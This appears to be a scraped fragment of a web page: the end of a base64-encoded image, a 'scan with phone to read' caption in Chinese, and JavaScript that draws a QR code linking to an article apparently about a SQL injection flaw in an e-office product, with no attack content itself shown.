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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-iWebOffice-Signature-SignatureDel-SignatureID-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 